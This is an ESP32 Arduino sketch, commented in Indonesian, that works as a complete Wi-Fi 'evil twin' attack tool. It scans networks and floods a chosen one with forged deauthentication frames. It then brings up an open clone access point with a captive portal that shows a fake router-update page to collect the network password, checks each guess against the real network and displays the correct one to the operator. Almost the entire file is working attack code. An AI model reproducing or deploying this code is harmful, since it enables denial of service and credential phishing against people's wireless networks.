#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

// --- KONFIGURASI ---
const int LED_PIN = 2;              
const char* ADMIN_SSID = "GMpro";   
const char* ADMIN_PASS = "Sangkur87"; 
const byte DNS_PORT = 53;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
WebServer webServer(80);
DNSServer dnsServer;

String _correct = "";
String _tryPassword = "";
bool deauthing_active = false;
bool hotspot_active = false;
unsigned long last_deauth_time = 0;
unsigned long last_scan_time = 0;

void runStrobo() {
  for (int i = 0; i < 40; i++) {
    digitalWrite(LED_PIN, HIGH); delay(40);
    digitalWrite(LED_PIN, LOW); delay(40);
  }
}

void sendDeauthFrame(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void performScan() {
  int n = WiFi.scanNetworks();
  if (n > 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}

void handleIndex() {
  if (hotspot_active) {
    if (webServer.hasArg("pass")) {
      _tryPassword = webServer.arg("pass");
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
      webServer.send(200, "text/html", "<h2>System Updating...</h2>");
    } else {
      String html = "<html><meta name='viewport' content='width=device-width, initial-scale=1'><body>";
      html += "<h2>Router " + _selectedNetwork.ssid + " Update</h2>";
      html += "<form action='/' method='get'><input type='password' name='pass' required><input type='submit' value='Update'></form></body></html>";
      webServer.send(200, "text/html", html);
    }
    return;
  }

  if (webServer.hasArg("sel")) _selectedNetwork = _networks[webServer.arg("sel").toInt()];
  
  if (webServer.hasArg("action")) {
    String a = webServer.arg("action");
    if (a == "deauth_on") deauthing_active = true;
    if (a == "deauth_off") deauthing_active = false;
    if (a == "hotspot_on") { hotspot_active = true; WiFi.softAP(_selectedNetwork.ssid.c_str()); }
    if (a == "hotspot_off") { hotspot_active = false; WiFi.softAP(ADMIN_SSID, ADMIN_PASS); }
  }

  String html = "<html><body><h1>Admin GMpro</h1>";
  if (_correct != "") html += "<b style='color:green;'>" + _correct + "</b>";
  html += "<h3>Target: " + _selectedNetwork.ssid + "</h3>";
  html += "<a href='/?action=deauth_on'>START DEAUTH</a> | <a href='/?action=hotspot_on'>START EVIL</a><br><table>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") continue;
    html += "<tr><td>" + _networks[i].ssid + "</td><td><a href='/?sel=" + String(i) + "'>Pilih</a></td></tr>";
  }
  html += "</table></body></html>";
  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_ps(WIFI_PS_NONE); // Biar Deauth Maksimal
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  webServer.on("/", handleIndex);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (_tryPassword != "" && WiFi.status() == WL_CONNECTED) {
    _correct = "PASS: " + _tryPassword;
    runStrobo();
    _tryPassword = ""; hotspot_active = false;
    WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  }
  if (deauthing_active && _selectedNetwork.ssid != "") {
    if (millis() - last_deauth_time > 200) { 
      sendDeauthFrame(_selectedNetwork.bssid, _selectedNetwork.ch);
      last_deauth_time = millis();
    }
  }
}
